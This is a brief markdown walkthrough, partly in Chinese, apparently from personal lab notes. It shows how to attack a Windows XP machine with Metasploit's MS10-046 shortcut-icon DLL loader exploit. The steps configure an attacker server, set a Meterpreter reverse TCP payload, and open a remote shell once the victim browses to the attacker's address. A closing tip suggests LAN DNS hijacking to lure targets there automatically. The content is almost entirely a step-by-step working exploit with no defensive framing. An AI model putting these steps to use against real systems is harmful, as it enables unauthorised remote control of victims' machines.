# ms10_046_shortcut_icon_dllloader

* kali Linux / xp

* metasploit

> msfconsole

> use exploit/windows/browser/ms10_046_shortcut_icon_dllloader

> show options

> set SRVHOST 192.168.135.100 //linux ip

> set PAYLOAD windows/meterpreter/reverse_tcp

> show options

> set LHOST 192.168.135.100 //linux ip

> exploit

* xp 浏览器访问 192.168.135.100:80
* linux 出现一下结果代表成功

![linux](../img/1540620517(1).jpg)

> sessions

> sessions -i 1

> shell

* 已成功登录xp系统

![xp](../img/1540620751(1).jpg)

* 可结合 局域网DNS劫持 实现让对方自动访问